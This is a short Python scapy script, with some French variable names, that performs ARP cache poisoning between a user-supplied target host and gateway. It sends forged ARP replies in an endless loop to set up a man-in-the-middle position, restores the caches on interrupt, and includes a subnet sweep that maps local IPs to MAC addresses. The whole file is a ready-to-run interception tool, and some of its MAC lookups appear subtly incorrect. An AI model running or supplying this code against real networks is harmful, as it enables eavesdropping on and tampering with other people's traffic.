from scapy.layers.l2 import *
from scapy.sendrecv import send

def spoofarpcache(targetip, targetmac, sourceip):
	send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)
	print("ARP Table restored to normal for", targetip)

def MultiSniffing():
	ipt = {}
	ip = ".".join(conf.route.route("0.0.0.0")[1].split(".")[:-1]) + "."
	for num in range(1, 254):
		if str(arping(ip + str(num))[0])[-2] != "0":
			ipt[ip + str(num)] = getmacbyip(ip + str(num))
	print(ipt)


def SingleSniffing(targetip, passerelleip):
	if str(arping(targetip)[0])[-2] != "0" :
		targetmac = getmacbyip(conf.route.route("0.0.0.0")[1])
		gatewayip = passerelleip#conf.route.route(targetip)[2]
		gatewaymac = getmacbyip(conf.route.route(passerelleip)[2])
		try:
			print("Sending spoofed ARP responses")
			while True:
				spoofarpcache(targetip, targetmac, gatewayip)
				spoofarpcache(gatewayip, gatewaymac, targetip)
		except KeyboardInterrupt:
			print("ARP spoofing stopped")
			restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
			restorearp(targetip, targetmac, gatewayip, gatewaymac)
			quit()
	else:
		print("Ip not reachable")

iptarget = input("Which ip target :")
ippasserelle = input("Which ip passerelle :")
SingleSniffing(iptarget, ippasserelle)